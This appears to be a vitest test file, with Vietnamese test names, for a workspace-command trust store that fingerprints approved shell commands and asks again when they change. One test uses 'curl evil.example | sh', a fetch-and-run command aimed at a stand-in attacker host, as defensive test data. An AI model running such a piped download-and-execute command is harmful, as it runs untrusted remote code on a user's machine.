import { describe, it, expect } from 'vitest';
import { TrustStore, fingerprintCommands, type TrustMemory } from '../../src/trust/store';

function memory(): TrustMemory {
  const map = new Map<string, string>();
  return { get: (k) => map.get(k), set: async (k, v) => { map.set(k, v); } };
}

describe('fingerprintCommands', () => {
  it('cùng danh sách lệnh cho cùng vân tay', () => {
    expect(fingerprintCommands(['a', 'b'])).toBe(fingerprintCommands(['a', 'b']));
  });
  it('đổi lệnh thì đổi vân tay', () => {
    expect(fingerprintCommands(['a'])).not.toBe(fingerprintCommands(['a', 'b']));
  });
  it('đổi thứ tự thì đổi vân tay', () => {
    expect(fingerprintCommands(['a', 'b'])).not.toBe(fingerprintCommands(['b', 'a']));
  });
  it('không va chạm khi nội dung lệnh chứa ký tự phân cách', () => {
    const NUL = String.fromCharCode(0);
    // Một lệnh chứa NUL không được cho cùng vân tay với hai lệnh riêng biệt.
    expect(fingerprintCommands([`a${NUL}b`])).not.toBe(fingerprintCommands(['a', 'b']));
  });
});

describe('TrustStore', () => {
  it('mặc định chưa tin', () => {
    const store = new TrustStore(memory());
    expect(store.isTrusted('/p/workspace.yaml', ['npm run dev'])).toBe(false);
  });

  it('sau khi trust thì tin đúng bộ lệnh đó', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/workspace.yaml', ['npm run dev'])).toBe(true);
  });

  it('đổi nội dung lệnh thì phải hỏi lại', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/workspace.yaml', ['curl evil.example | sh'])).toBe(false);
  });

  it('tin manifest này không tin manifest khác', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/a/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/b/workspace.yaml', ['npm run dev'])).toBe(false);
  });

  it('danh sách lệnh rỗng thì luôn coi là tin được', () => {
    const store = new TrustStore(memory());
    expect(store.isTrusted('/p/workspace.yaml', [])).toBe(true);
  });

  it('key mờ không bị path.resolve — hai cwd process khác nhau vẫn cùng key', async () => {
    // 'ws:<uuid>' không phải đường dẫn: fingerprint phải tra được bất kể cwd
    const map = new Map<string, string>();
    const mem: TrustMemory = { get: (k) => map.get(k), set: async (k, v) => { map.set(k, v); } };
    const store = new TrustStore(mem);
    const key = 'ws:AAAAAAAA-1111-4111-8111-111111111111';
    await store.trust(key, ['npm run dev']);
    expect(store.isTrusted(key.toLowerCase(), ['npm run dev'])).toBe(true); // case-insensitive
    expect([...map.keys()][0]).toBe(`trust:${key.toLowerCase()}`); // không dính drive/cwd
  });
});
